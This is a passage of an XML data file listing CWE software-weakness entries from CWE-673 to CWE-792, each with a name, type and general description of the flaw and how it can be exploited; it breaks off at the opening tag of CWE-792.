<vulnerability label="CWE-673" name="External Influence of Sphere Definition" type="Class" reference="CWE">
  <description>The product does not prevent the definition of control spheres from external actors.Typically, a product defines its control sphere within the code itself, or through configuration by the product's administrator. In some cases, an external party can change the definition of the control sphere. This is typically a resultant weakness.</description>
</vulnerability>
<vulnerability label="CWE-674" name="Uncontrolled Recursion" type="Base" reference="CWE">
  <description>The product does not properly control the amount of recursion that takes place, which consumes excessive resources, such as allocated memory or the program stack.</description>
</vulnerability>
<vulnerability label="CWE-675" name="Duplicate Operations on Resource" type="Class" reference="CWE">
  <description>The product performs the same operation on a resource two or more times, when the operation should only be applied once.</description>
</vulnerability>
<vulnerability label="CWE-676" name="Use of Potentially Dangerous Function" type="Base" reference="CWE">
  <description>The program invokes a potentially dangerous function that could introduce a vulnerability if it is used incorrectly, but the function can also be used safely.</description>
</vulnerability>
<vulnerability label="CWE-681" name="Incorrect Conversion between Numeric Types" type="Base" reference="CWE">
  <description>When converting from one data type to another, such as long to integer, data can be omitted or translated in a way that produces unexpected values. If the resulting values are used in a sensitive context, then dangerous behaviors may occur.</description>
</vulnerability>
<vulnerability label="CWE-682" name="Incorrect Calculation" type="Class" reference="CWE">
  <description>The software performs a calculation that generates incorrect or unintended results that are later used in security-critical decisions or resource management.When software performs a security-critical calculation incorrectly, it might lead to incorrect resource allocations, incorrect privilege assignments, or failed comparisons among other things. Many of the direct results of an incorrect calculation can lead to even larger problems such as failed protection mechanisms or even arbitrary code execution.</description>
</vulnerability>
<vulnerability label="CWE-683" name="Function Call With Incorrect Order of Arguments" type="Variant" reference="CWE">
  <description>The software calls a function, procedure, or routine, but the caller specifies the arguments in an incorrect order, leading to resultant weaknesses.While this weakness might be caught by the compiler in some languages, it can occur more frequently in cases in which the called function accepts variable numbers or types of arguments, such as format strings in C. It also can occur in languages or environments that do not enforce strong typing.</description>
</vulnerability>
<vulnerability label="CWE-684" name="Incorrect Provision of Specified Functionality" type="Base" reference="CWE">
  <description>The code does not function according to its published specifications, potentially leading to incorrect usage.When providing functionality to an external party, it is important that the software behaves in accordance with the details specified. When requirements of nuances are not documented, the functionality may produce unintended behaviors for the caller, possibly leading to an exploitable state.</description>
</vulnerability>
<vulnerability label="CWE-685" name="Function Call With Incorrect Number of Arguments" type="Variant" reference="CWE">
  <description>The software calls a function, procedure, or routine, but the caller specifies too many arguments, or too few arguments, which may lead to undefined behavior and resultant weaknesses.</description>
</vulnerability>
<vulnerability label="CWE-686" name="Function Call With Incorrect Argument Type" type="Variant" reference="CWE">
  <description>The software calls a function, procedure, or routine, but the caller specifies an argument that is the wrong data type, which may lead to resultant weaknesses.This weakness is most likely to occur in loosely typed languages, or in strongly typed languages in which the types of variable arguments cannot be enforced at compilation time, or where there is implicit casting.</description>
</vulnerability>
<vulnerability label="CWE-687" name="Function Call With Incorrectly Specified Argument Value" type="Variant" reference="CWE">
  <description>The software calls a function, procedure, or routine, but the caller specifies an argument that contains the wrong value, which may lead to resultant weaknesses.</description>
</vulnerability>
<vulnerability label="CWE-688" name="Function Call With Incorrect Variable or Reference as Argument" type="Variant" reference="CWE">
  <description>The software calls a function, procedure, or routine, but the caller specifies the wrong variable or reference as one of the arguments, which may lead to undefined behavior and resultant weaknesses.</description>
</vulnerability>
<vulnerability label="CWE-69" name="Improper Handling of Windows ::DATA Alternate Data Stream" type="Variant" reference="CWE">
  <description>The software does not properly prevent access to, or detect usage of, alternate data streams (ADS).An attacker can use an ADS to hide information about a file (e.g. size, the name of the process) from a system or file browser tools such as Windows Explorer and 'dir' at the command line utility. Alternately, the attacker might be able to bypass intended access restrictions for the associated data fork.</description>
</vulnerability>
<vulnerability label="CWE-691" name="Insufficient Control Flow Management" type="Class" reference="CWE">
  <description>The code does not sufficiently manage its control flow during execution, creating conditions in which the control flow can be modified in unexpected ways.</description>
</vulnerability>
<vulnerability label="CWE-693" name="Protection Mechanism Failure" type="Class" reference="CWE">
  <description>The product does not use or incorrectly uses a protection mechanism that provides sufficient defense against directed attacks against the product.This weakness covers three distinct situations. A &quot;missing&quot; protection mechanism occurs when the application does not define any mechanism against a certain class of attack. An &quot;insufficient&quot; protection mechanism might provide some defenses - for example, against the most common attacks - but it does not protect against everything that is intended. Finally, an &quot;ignored&quot; mechanism occurs when a mechanism is available and in active use within the product, but the developer has not applied it in some code path.</description>
</vulnerability>
<vulnerability label="CWE-694" name="Use of Multiple Resources with Duplicate Identifier" type="Base" reference="CWE">
  <description>The product uses multiple resources that can have the same identifier, in a context in which unique identifiers are required. This could lead to operations on the wrong resource, or inconsistent operations.</description>
</vulnerability>
<vulnerability label="CWE-695" name="Use of Low-Level Functionality" type="Base" reference="CWE">
  <description>The software uses low-level functionality that is explicitly prohibited by the framework or specification under which the software is supposed to operate.The use of low-level functionality can violate the specification in unexpected ways that effectively disable built-in protection mechanisms, introduce exploitable inconsistencies, or otherwise expose the functionality to attack.</description>
</vulnerability>
<vulnerability label="CWE-696" name="Incorrect Behavior Order" type="Class" reference="CWE">
  <description>The software performs multiple related behaviors, but the behaviors are performed in the wrong order in ways which may produce resultant weaknesses.</description>
</vulnerability>
<vulnerability label="CWE-697" name="Insufficient Comparison" type="Class" reference="CWE">
  <description>The software compares two entities in a security-relevant context, but the comparison is insufficient, which may lead to resultant weaknesses.This weakness class covers several possibilities:the comparison checks one factor incorrectly;the comparison should consider multiple factors, but it does not check some of those factors at all.</description>
</vulnerability>
<vulnerability label="CWE-698" name="Redirect Without Exit" type="Base" reference="CWE">
  <description>The web application sends a redirect to another location, but instead of exiting, it executes additional code.</description>
</vulnerability>
<vulnerability label="CWE-7" name="J2EE Misconfiguration: Missing Custom Error Page" type="Variant" reference="CWE">
  <description>The default error page of a web application should not display sensitive information about the software system.A Web application must define a default error page for 4xx errors (e.g. 404), 5xx (e.g. 500) errors and catch java.lang.Throwable exceptions to prevent attackers from mining information from the application container's built-in error response.</description>
</vulnerability>
<vulnerability label="CWE-703" name="Improper Check or Handling of Exceptional Conditions" type="Class" reference="CWE">
  <description>The software does not properly anticipate or handle exceptional conditions that rarely occur during normal operation of the software.</description>
</vulnerability>
<vulnerability label="CWE-704" name="Incorrect Type Conversion or Cast" type="Class" reference="CWE">
  <description>The software does not correctly convert an object, resource or structure from one type to a different type.</description>
</vulnerability>
<vulnerability label="CWE-705" name="Incorrect Control Flow Scoping" type="Class" reference="CWE">
  <description>The software does not properly return control flow to the proper location after it has completed a task or detected an unusual condition.</description>
</vulnerability>
<vulnerability label="CWE-706" name="Use of Incorrectly-Resolved Name or Reference" type="Class" reference="CWE">
  <description>The software uses a name or reference to access a resource, but the name/reference resolves to a resource that is outside of the intended control sphere.</description>
</vulnerability>
<vulnerability label="CWE-707" name="Improper Enforcement of Message or Data Structure" type="Class" reference="CWE">
  <description>The software does not enforce or incorrectly enforces that structured messages or data are well-formed before being read from an upstream component or sent to a downstream component.If a message is malformed it may cause the message to be incorrectly interpreted.This weakness typically applies in cases where the product prepares a control message that another process must act on, such as a command or query, and malicious input that was intended as data, can enter the control plane instead. However, this weakness also applies to more general cases where there are not always control implications.</description>
</vulnerability>
<vulnerability label="CWE-708" name="Incorrect Ownership Assignment" type="Base" reference="CWE">
  <description>The software assigns an owner to a resource, but the owner is outside of the intended control sphere.This may allow the resource to be manipulated by actors outside of the intended control sphere.</description>
</vulnerability>
<vulnerability label="CWE-71" name="Apple '.DS_Store'" type="Variant" reference="CWE">
  <description>Software operating in a MAC OS environment, where .DS_Store is in effect, must carefully manage hard links, otherwise an attacker may be able to leverage a hard link from .DS_Store to overwrite arbitrary files and gain privileges.</description>
</vulnerability>
<vulnerability label="CWE-710" name="Coding Standards Violation" type="Class" reference="CWE">
  <description>The software does not follow certain coding rules for development, which can lead to resultant weaknesses or increase the severity of the associated vulnerabilities.</description>
</vulnerability>
<vulnerability label="CWE-72" name="Improper Handling of Apple HFS+ Alternate Data Stream Path" type="Variant" reference="CWE">
  <description>The software does not properly handle special paths that may identify the data or resource fork of a file on the HFS+ file system.If the software chooses actions to take based on the file name, then if an attacker provides the data or resource fork, the software may take unexpected actions. Further, if the software intends to restrict access to a file, then an attacker might still be able to bypass intended access restrictions by requesting the data or resource fork for that file.</description>
</vulnerability>
<vulnerability label="CWE-73" name="External Control of File Name or Path" type="Class" reference="CWE">
  <description>The software allows user input to control or influence paths or file names that are used in filesystem operations.This could allow an attacker to access or modify system files or other files that are critical to the application.Path manipulation errors occur when the following two conditions are met:1. An attacker can specify a path used in an operation on the filesystem.2. By specifying the resource, the attacker gains a capability that would not otherwise be permitted.For example, the program may give the attacker the ability to overwrite the specified file or run with a configuration controlled by the attacker.</description>
</vulnerability>
<vulnerability label="CWE-732" name="Incorrect Permission Assignment for Critical Resource" type="Class" reference="CWE">
  <description>The software specifies permissions for a security-critical resource in a way that allows that resource to be read or modified by unintended actors.When a resource is given a permissions setting that provides access to a wider range of actors than required, it could lead to the exposure of sensitive information, or the modification of that resource by unintended parties. This is especially dangerous when the resource is related to program configuration, execution or sensitive user data.</description>
</vulnerability>
<vulnerability label="CWE-733" name="Compiler Optimization Removal or Modification of Security-critical Code" type="Base" reference="CWE">
  <description>The developer builds a security-critical protection mechanism into the software but the compiler optimizes the program such that the mechanism is removed or modified.</description>
</vulnerability>
<vulnerability label="CWE-74" name="Improper Neutralization of Special Elements in Output Used by a Downstream Component ('Injection')" type="Class" reference="CWE">
  <description>The software constructs all or part of a command, data structure, or record using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify how it is parsed or interpreted when it is sent to a downstream component.Software has certain assumptions about what constitutes data and control respectively. It is the lack of verification of these assumptions for user-controlled input that leads to injection problems. Injection problems encompass a wide variety of issues -- all mitigated in very different ways and usually attempted in order to alter the control flow of the process. For this reason, the most effective way to discuss these weaknesses is to note the distinct features which classify them as injection weaknesses. The most important issue to note is that all injection problems share one thing in common -- i.e., they allow for the injection of control plane data into the user-controlled data plane. This means that the execution of the process may be altered by sending code in through legitimate data channels, using no other mechanism. While buffer overflows, and many other flaws, involve the use of some further issue to gain execution, injection problems need only for the data to be parsed. The most classic instantiations of this category of weakness are SQL injection and format string vulnerabilities.</description>
</vulnerability>
<vulnerability label="CWE-749" name="Exposed Dangerous Method or Function" type="Base" reference="CWE">
  <description>The software provides an Applications Programming Interface (API) or similar interface for interaction with external actors, but the interface includes a dangerous method or function that is not properly restricted.This weakness can lead to a wide variety of resultant weaknesses, depending on the behavior of the exposed method. It can apply to any number of technologies and approaches, such as ActiveX controls, Java functions, IOCTLs, and so on.The exposure can occur in a few different ways:1) The function/method was never intended to be exposed to outside actors.2) The function/method was only intended to be accessible to a limited set of actors, such as Internet-based access from a single web site.</description>
</vulnerability>
<vulnerability label="CWE-75" name="Failure to Sanitize Special Elements into a Different Plane (Special Element Injection)" type="Class" reference="CWE">
  <description>The software does not adequately filter user-controlled input for special elements with control implications.</description>
</vulnerability>
<vulnerability label="CWE-754" name="Improper Check for Unusual or Exceptional Conditions" type="Class" reference="CWE">
  <description>The software does not check or improperly checks for unusual or exceptional conditions that are not expected to occur frequently during day to day operation of the software.The programmer may assume that certain events or conditions will never occur or do not need to be worried about, such as low memory conditions, lack of access to resources due to restrictive permissions, or misbehaving clients or components. However, attackers may intentionally trigger these unusual conditions, thus violating the programmer's assumptions, possibly introducing instability, incorrect behavior, or a vulnerability.Note that this entry is not exclusively about the use of exceptions and exception handling, which are mechanisms for both checking and handling unusual or unexpected conditions.</description>
</vulnerability>
<vulnerability label="CWE-755" name="Improper Handling of Exceptional Conditions" type="Class" reference="CWE">
  <description>The software does not handle or incorrectly handles an exceptional condition.</description>
</vulnerability>
<vulnerability label="CWE-756" name="Missing Custom Error Page" type="Class" reference="CWE">
  <description>The software does not return custom error pages to the user, possibly exposing sensitive information.</description>
</vulnerability>
<vulnerability label="CWE-757" name="Selection of Less-Secure Algorithm During Negotiation ('Algorithm Downgrade')" type="Class" reference="CWE">
  <description>A protocol or its implementation supports interaction between multiple actors and allows those actors to negotiate which algorithm should be used as a protection mechanism such as encryption or authentication, but it does not select the strongest algorithm that is available to both parties.When a security mechanism can be forced to downgrade to use a less secure algorithm, this can make it easier for attackers to compromise the software by exploiting weaker algorithm. The victim might not be aware that the less secure algorithm is being used. For example, if an attacker can force a communications channel to use cleartext instead of strongly-encrypted data, then the attacker could read the channel by sniffing, instead of going through extra effort of trying to decrypt the data using brute force techniques.</description>
</vulnerability>
<vulnerability label="CWE-758" name="Reliance on Undefined, Unspecified, or Implementation-Defined Behavior" type="Class" reference="CWE">
  <description>The software uses an API function, data structure, or other entity in a way that relies on properties that are not always guaranteed to hold for that entity.This can lead to resultant weaknesses when the required properties change, such as when the software is ported to a different platform or if an interaction error (CWE-435) occurs.</description>
</vulnerability>
<vulnerability label="CWE-759" name="Use of a One-Way Hash without a Salt" type="Class" reference="CWE">
  <description>The software uses a one-way cryptographic hash against an input that should not be reversible, such as a password, but the software does not also use a salt as part of the input.This makes it easier for attackers to pre-compute the hash value using dictionary attack techniques such as rainbow tables.</description>
</vulnerability>
<vulnerability label="CWE-76" name="Improper Neutralization of Equivalent Special Elements" type="Base" reference="CWE">
  <description>The software properly neutralizes certain special elements, but it improperly neutralizes equivalent special elements.The software may have a fixed list of special characters it believes is complete. However, there may be alternate encodings, or representations that also have the same meaning. For example, the software may filter out a leading slash (/) to prevent absolute path names, but does not account for a tilde (~) followed by a user name, which on some *nix systems could be expanded to an absolute pathname. Alternately, the software might filter a dangerous &quot;-e&quot; command-line switch when calling an external program, but it might not account for &quot;--exec&quot; or other switches that have the same semantics.</description>
</vulnerability>
<vulnerability label="CWE-760" name="Use of a One-Way Hash with a Predictable Salt" type="Class" reference="CWE">
  <description>The software uses a one-way cryptographic hash against an input that should not be reversible, such as a password, but the software uses a predictable salt as part of the input.This makes it easier for attackers to pre-compute the hash value using dictionary attack techniques such as rainbow tables, effectively disabling the protection that an unpredictable salt would provide.</description>
</vulnerability>
<vulnerability label="CWE-761" name="Free of Pointer not at Start of Buffer" type="Variant" reference="CWE">
  <description>The application calls free() on a pointer to a memory resource that was allocated on the heap, but the pointer is not at the start of the buffer.This can cause the application to crash, or in some cases, modify critical program variables or execute code.This weakness often occurs when the memory is allocated explicitly on the heap with one of the malloc() family functions and free() is called, but pointer arithmetic has caused the pointer to be in the interior or end of the buffer.</description>
</vulnerability>
<vulnerability label="CWE-762" name="Mismatched Memory Management Routines" type="Variant" reference="CWE">
  <description>The application attempts to return a memory resource to the system, but it calls a release function that is not compatible with the function that was originally used to allocate that resource.This weakness can be generally described as mismatching memory management routines, such as:The memory was allocated on the stack (automatically), but it was deallocated using the memory management routine free() (CWE-590), which is intended for explicitly allocated heap memory.The memory was allocated explicitly using one set of memory management functions, and deallocated using a different set. For example, memory might be allocated with malloc() in C++ instead of the new operator, and then deallocated with the delete operator.When the memory management functions are mismatched, the consequences may be as severe as code execution, memory corruption, or program crash. Consequences and ease of exploit will vary depending on the implementation of the routines and the object being managed.</description>
</vulnerability>
<vulnerability label="CWE-763" name="Release of Invalid Pointer or Reference" type="Base" reference="CWE">
  <description>The application attempts to return a memory resource to the system, but calls the wrong release function or calls the appropriate release function incorrectly.This weakness can take several forms, such as:The memory was allocated, explicitly or implicitly, via one memory management method and deallocated using a different, non-compatible function (CWE-762).The function calls or memory management routines chosen are appropriate, however they are used incorrectly, such as in CWE-761.</description>
</vulnerability>
<vulnerability label="CWE-764" name="Multiple Locks of a Critical Resource" type="Variant" reference="CWE">
  <description>The software locks a critical resource more times than intended, leading to an unexpected state in the system. When software is operating in a concurrent environment and repeatedly locks a critical resource, the consequences will vary based on the type of lock, the lock's implementation, and the resource being protected. In some situations such as with semaphores, the resources are pooled and extra locking calls will reduce the size of the total available pool, possibly leading to degraded performance or a denial of service. If this can be triggered by an attacker, it will be similar to an unrestricted lock (CWE-412). In the context of a binary lock, it is likely that any duplicate locking attempts will never succeed since the lock is already held and progress may not be possible.</description>
</vulnerability>
<vulnerability label="CWE-765" name="Multiple Unlocks of a Critical Resource" type="Variant" reference="CWE">
  <description>The software unlocks a critical resource more times than intended, leading to an unexpected state in the system.When software is operating in a concurrent environment and repeatedly unlocks a critical resource, the consequences will vary based on the type of lock, the lock's implementation, and the resource being protected. In some situations such as with semaphores, the resources are pooled and extra calls to unlock will increase the count for the number of available resources, likely resulting in a crash or unpredictable behavior when the system nears capacity.</description>
</vulnerability>
<vulnerability label="CWE-766" name="Critical Variable Declared Public" type="Variant" reference="CWE">
  <description>The software declares a critical variable or field to be public when intended security policy requires it to be private.</description>
</vulnerability>
<vulnerability label="CWE-767" name="Access to Critical Private Variable via Public Method" type="Variant" reference="CWE">
  <description>The software defines a public method that reads or modifies a private variable.If an attacker modifies the variable to contain unexpected values, this could violate assumptions from other parts of the code. Additionally, if an attacker can read the private variable, it may expose sensitive information or make it easier to launch further attacks.</description>
</vulnerability>
<vulnerability label="CWE-768" name="Incorrect Short Circuit Evaluation" type="Variant" reference="CWE">
  <description>The software contains a conditional statement with multiple logical expressions in which one of the non-leading expressions may produce side effects. This may lead to an unexpected state in the program after the execution of the conditional, because short-circuiting logic may prevent the side effects from occurring.Usage of short circuit evaluation, though well-defined in the C standard, may alter control flow in a way that introduces logic errors that are difficult to detect, possibly causing errors later during the software's execution. If an attacker can discover such an inconsistency, it may be exploitable to gain arbitrary control over a system.If the first condition of an &quot;or&quot; statement is assumed to be true under normal circumstances, or if the first condition of an &quot;and&quot; statement is assumed to be false, then any subsequent conditional may contain its own logic errors that are not detected during code review or testing.Finally, the usage of short circuit evaluation may decrease the maintainability of the code.</description>
</vulnerability>
<vulnerability label="CWE-77" name="Improper Neutralization of Special Elements used in a Command ('Command Injection')" type="Class" reference="CWE">
  <description>The software constructs all or part of a command using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify the intended command when it is sent to a downstream component. Command injection vulnerabilities typically occur when:1. Data enters the application from an untrusted source.2. The data is part of a string that is executed as a command by the application.3. By executing the command, the application gives an attacker a privilege or capability that the attacker would not otherwise have.</description>
</vulnerability>
<vulnerability label="CWE-770" name="Allocation of Resources Without Limits or Throttling" type="Base" reference="CWE">
  <description>The software allocates a reusable resource or group of resources on behalf of an actor without imposing any restrictions on how many resources can be allocated, in violation of the intended security policy for that actor.</description>
</vulnerability>
<vulnerability label="CWE-771" name="Missing Reference to Active Allocated Resource" type="Base" reference="CWE">
  <description>The software does not properly maintain a reference to a resource that has been allocated, which prevents the resource from being reclaimed.This does not necessarily apply in languages or frameworks that automatically perform garbage collection, since the removal of all references may act as a signal that the resource is ready to be reclaimed.</description>
</vulnerability>
<vulnerability label="CWE-772" name="Missing Release of Resource after Effective Lifetime" type="Base" reference="CWE">
  <description>The software does not release a resource after its effective lifetime has ended, i.e., after the resource is no longer needed.When a resource is not released after use, it can allow attackers to cause a denial of service.</description>
</vulnerability>
<vulnerability label="CWE-773" name="Missing Reference to Active File Descriptor or Handle" type="Variant" reference="CWE">
  <description>The software does not properly maintain references to a file descriptor or handle, which prevents that file descriptor/handle from being reclaimed.This can cause the software to consume all available file descriptors or handles, which can prevent other processes from performing critical file processing operations.</description>
</vulnerability>
<vulnerability label="CWE-774" name="Allocation of File Descriptors or Handles Without Limits or Throttling" type="Variant" reference="CWE">
  <description>The software allocates file descriptors or handles on behalf of an actor without imposing any restrictions on how many descriptors can be allocated, in violation of the intended security policy for that actor.This can cause the software to consume all available file descriptors or handles, which can prevent other processes from performing critical file processing operations.</description>
</vulnerability>
<vulnerability label="CWE-775" name="Missing Release of File Descriptor or Handle after Effective Lifetime" type="Variant" reference="CWE">
  <description>The software does not release a file descriptor or handle after its effective lifetime has ended, i.e., after the file descriptor/handle is no longer needed.When a file descriptor or handle is not released after use (typically by explicitly closing it), attackers can cause a denial of service by consuming all available file descriptors/handles, or otherwise preventing other system processes from obtaining their own file descriptors/handles.</description>
</vulnerability>
<vulnerability label="CWE-776" name="Unrestricted Recursive Entity References in DTDs ('XML Bomb')" type="Variant" reference="CWE">
  <description>The software requires the use of XML documents and allows their structure to be defined with a Document Type Definition (DTD). The software allows the DTD to recursively define entities which can lead to explosive growth of data when parsed.</description>
</vulnerability>
<vulnerability label="CWE-777" name="Regular Expression without Anchors" type="Variant" reference="CWE">
  <description>The software uses a regular expression to perform neutralization, but the regular expression is not anchored and may allow malicious or malformed data to slip through.When performing tasks such as whitelist validation, data is examined and possibly modified to ensure that it is well-formed and adheres to a list of safe values. If the regular expression is not anchored, malicious or malformed data may be included before or after any string matching the regular expression. The type of malicious data that is allowed will depend on the context of the application and which anchors are omitted from the regular expression.</description>
</vulnerability>
<vulnerability label="CWE-778" name="Insufficient Logging" type="Base" reference="CWE">
  <description>When a security-critical event occurs, the software either does not record the event or omits important details about the event when logging it.When security-critical events are not logged properly, such as a failed login attempt, this can make malicious behavior more difficult to detect and may hinder forensic analysis after an attack succeeds.</description>
</vulnerability>
<vulnerability label="CWE-779" name="Logging of Excessive Data" type="Base" reference="CWE">
  <description>The software logs too much information, making log files hard to process and possibly hindering recovery efforts or forensic analysis after an attack.While logging is a good practice in general, and very high levels of logging are appropriate for debugging stages of development, too much logging in a production environment might hinder a system administrator's ability to detect anomalous conditions. This can provide cover for an attacker while attempting to penetrate a system, clutter the audit trail for forensic analysis, or make it more difficult to debug problems in a production environment.</description>
</vulnerability>
<vulnerability label="CWE-78" name="Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')" type="Base" reference="CWE">
  <description>The software constructs all or part of an OS command using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify the intended OS command when it is sent to a downstream component.This could allow attackers to execute unexpected, dangerous commands directly on the operating system. This weakness can lead to a vulnerability in environments in which the attacker does not have direct access to the operating system, such as in web applications. Alternately, if the weakness occurs in a privileged program, it could allow the attacker to specify commands that normally would not be accessible, or to call alternate commands with privileges that the attacker does not have. The problem is exacerbated if the compromised process does not follow the principle of least privilege, because the attacker-controlled commands may run with special system privileges that increases the amount of damage.There are at least two subtypes of OS command injection:The application intends to execute a single, fixed program that is under its own control. It intends to use externally-supplied inputs as arguments to that program. For example, the program might use system(&quot;nslookup [HOSTNAME]&quot;) to run nslookup and allow the user to supply a HOSTNAME, which is used as an argument. Attackers cannot prevent nslookup from executing. However, if the program does not remove command separators from the HOSTNAME argument, attackers could place the separators into the arguments, which allows them to execute their own program after nslookup has finished executing.The application accepts an input that it uses to fully select which program to run, as well as which commands to use. The application simply redirects this entire command to the operating system. For example, the program might use &quot;exec([COMMAND])&quot; to execute the [COMMAND] that was supplied by the user. If the COMMAND is under attacker control, then the attacker can execute arbitrary commands or programs. If the command is being executed using functions like exec() and CreateProcess(), the attacker might not be able to combine multiple commands together in the same line.From a weakness standpoint, these variants represent distinct programmer errors. In the first variant, the programmer clearly intends that input from untrusted parties will be part of the arguments in the command to be executed. In the second variant, the programmer does not intend for the command to be accessible to any untrusted party, but the programmer probably has not accounted for alternate ways in which malicious attackers can provide input.</description>
</vulnerability>
<vulnerability label="CWE-780" name="Use of RSA Algorithm without OAEP" type="Variant" reference="CWE">
  <description>The software uses the RSA algorithm but does not incorporate Optimal Asymmetric Encryption Padding (OAEP), which might weaken the encryption.Padding schemes are often used with cryptographic algorithms to make the plaintext less predictable and complicate attack efforts. The OAEP scheme is often used with RSA to nullify the impact of predictable common text.</description>
</vulnerability>
<vulnerability label="CWE-781" name="Improper Address Validation in IOCTL with METHOD_NEITHER I/O Control Code" type="Variant" reference="CWE">
  <description>The software defines an IOCTL that uses METHOD_NEITHER for I/O, but it does not validate or incorrectly validates the addresses that are provided.When an IOCTL uses the METHOD_NEITHER option for I/O control, it is the responsibility of the IOCTL to validate the addresses that have been supplied to it. If validation is missing or incorrect, attackers can supply arbitrary memory addresses, leading to code execution or a denial of service.</description>
</vulnerability>
<vulnerability label="CWE-782" name="Exposed IOCTL with Insufficient Access Control" type="Variant" reference="CWE">
  <description>The software implements an IOCTL with functionality that should be restricted, but it does not properly enforce access control for the IOCTL.When an IOCTL contains privileged functionality and is exposed unnecessarily, attackers may be able to access this functionality by invoking the IOCTL. Even if the functionality is benign, if the programmer has assumed that the IOCTL would only be accessed by a trusted process, there may be little or no validation of the incoming data, exposing weaknesses that would never be reachable if the attacker cannot call the IOCTL directly.The implementations of IOCTLs will differ between operating system types and versions, so the methods of attack and prevention may vary widely.</description>
</vulnerability>
<vulnerability label="CWE-783" name="Operator Precedence Logic Error" type="Variant" reference="CWE">
  <description>The program uses an expression in which operator precedence causes incorrect logic to be used.While often just a bug, operator precedence logic errors can have serious consequences if they are used in security-critical code, such as making an authentication decision.</description>
</vulnerability>
<vulnerability label="CWE-784" name="Reliance on Cookies without Validation and Integrity Checking in a Security Decision" type="Variant" reference="CWE">
  <description>The application uses a protection mechanism that relies on the existence or values of a cookie, but it does not properly ensure that the cookie is valid for the associated user. Attackers can easily modify cookies, within the browser or by implementing the client-side code outside of the browser. Attackers can bypass protection mechanisms such as authorization and authentication by modifying the cookie to contain an expected value.</description>
</vulnerability>
<vulnerability label="CWE-785" name="Use of Path Manipulation Function without Maximum-sized Buffer" type="Variant" reference="CWE">
  <description>The software invokes a function for normalizing paths or file names, but it provides an output buffer that is smaller than the maximum possible size, such as PATH_MAX.Passing an inadequately-sized output buffer to a path manipulation function can result in a buffer overflow. Such functions include realpath(), readlink(), PathAppend(), and others.</description>
</vulnerability>
<vulnerability label="CWE-786" name="Access of Memory Location Before Start of Buffer" type="Base" reference="CWE">
  <description>The software reads or writes to a buffer using an index or pointer that references a memory location prior to the beginning of the buffer.This typically occurs when a pointer or its index is decremented to a position before the buffer, when pointer arithmetic results in a position before the beginning of the valid memory location, or when a negative index is used.</description>
</vulnerability>
<vulnerability label="CWE-787" name="Out-of-bounds Write" type="Base" reference="CWE">
  <description>The software writes data past the end, or before the beginning, of the intended buffer. This typically occurs when the pointer or its index is incremented or decremented to a position beyond the bounds of the buffer or when pointer arithmetic results in a position outside of the valid memory location to name a few. This may result in corruption of sensitive information, a crash, or code execution among other things.</description>
</vulnerability>
<vulnerability label="CWE-788" name="Access of Memory Location After End of Buffer" type="Base" reference="CWE">
  <description>The software reads or writes to a buffer using an index or pointer that references a memory location after the end of the buffer.This typically occurs when a pointer or its index is decremented to a position before the buffer, when pointer arithmetic results in a position before the beginning of the valid memory location, or when a negative index is used. These problems may be resultant from missing sentinel values (CWE-463) or trusting a user-influenced input length variable.</description>
</vulnerability>
<vulnerability label="CWE-789" name="Uncontrolled Memory Allocation" type="Variant" reference="CWE">
  <description>The product allocates memory based on an untrusted size value, but it does not validate or incorrectly validates the size, allowing arbitrary amounts of memory to be allocated.</description>
</vulnerability>
<vulnerability label="CWE-79" name="Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')" type="Base" reference="CWE">
  <description>The software does not neutralize or incorrectly neutralizes user-controllable input before it is placed in output that is used as a web page that is served to other users.Cross-site scripting (XSS) vulnerabilities occur when:1. Untrusted data enters a web application, typically from a web request.2. The web application dynamically generates a web page that contains this untrusted data.3. During page generation, the application does not prevent the data from containing content that is executable by a web browser, such as JavaScript, HTML tags, HTML attributes, mouse events, Flash, ActiveX, etc.4. A victim visits the generated web page through a web browser, which contains malicious script that was injected using the untrusted data.5. Since the script comes from a web page that was sent by the web server, the victim's web browser executes the malicious script in the context of the web server's domain.6. This effectively violates the intention of the web browser's same-origin policy, which states that scripts in one domain should not be able to access resources or run code in a different domain.There are three main kinds of XSS:The server reads data directly from the HTTP request and reflects it back in the HTTP response. Reflected XSS exploits occur when an attacker causes a victim to supply dangerous content to a vulnerable web application, which is then reflected back to the victim and executed by the web browser. The most common mechanism for delivering malicious content is to include it as a parameter in a URL that is posted publicly or e-mailed directly to the victim. URLs constructed in this manner constitute the core of many phishing schemes, whereby an attacker convinces a victim to visit a URL that refers to a vulnerable site. After the site reflects the attacker's content back to the victim, the content is executed by the victim's browser.The application stores dangerous data in a database, message forum, visitor log, or other trusted data store. At a later time, the dangerous data is subsequently read back into the application and included in dynamic content. From an attacker's perspective, the optimal place to inject malicious content is in an area that is displayed to either many users or particularly interesting users. Interesting users typically have elevated privileges in the application or interact with sensitive data that is valuable to the attacker. If one of these users executes malicious content, the attacker may be able to perform privileged operations on behalf of the user or gain access to sensitive data belonging to the user. For example, the attacker might inject XSS into a log message, which might not be handled properly when an administrator views the logs. In DOM-based XSS, the client performs the injection of XSS into the page; in the other types, the server performs the injection. DOM-based XSS generally involves server-controlled, trusted script that is sent to the client, such as Javascript that performs sanity checks on a form before the user submits it. If the server-supplied script processes user-supplied data and then injects it back into the web page (such as with dynamic HTML), then DOM-based XSS is possible.Once the malicious script is injected, the attacker can perform a variety of malicious activities. The attacker could transfer private information, such as cookies that may include session information, from the victim's machine to the attacker. The attacker could send malicious requests to a web site on behalf of the victim, which could be especially dangerous to the site if the victim has administrator privileges to manage that site. Phishing attacks could be used to emulate trusted web sites and trick the victim into entering a password, allowing the attacker to compromise the victim's account on that web site. Finally, the script could exploit a vulnerability in the web browser itself possibly taking over the victim's machine, sometimes referred to as &quot;drive-by hacking.&quot;In many cases, the attack can be launched without the victim even being aware of it. Even with careful users, attackers frequently use a variety of methods to encode the malicious portion of the attack, such as URL encoding or Unicode, so the request looks less suspicious.</description>
</vulnerability>
<vulnerability label="CWE-790" name="Improper Filtering of Special Elements" type="Class" reference="CWE">
  <description>The software receives data from an upstream component, but does not filter or incorrectly filters special elements before sending it to a downstream component.</description>
</vulnerability>
<vulnerability label="CWE-791" name="Incomplete Filtering of Special Elements" type="Base" reference="CWE">
  <description>The software receives data from an upstream component, but does not completely filter special elements before sending it to a downstream component.</description>
</vulnerability>
<vulnerability label="CWE-792" name="Incomplete Filtering of One or More Instances of Special Elements" type="Variant" reference="CWE">
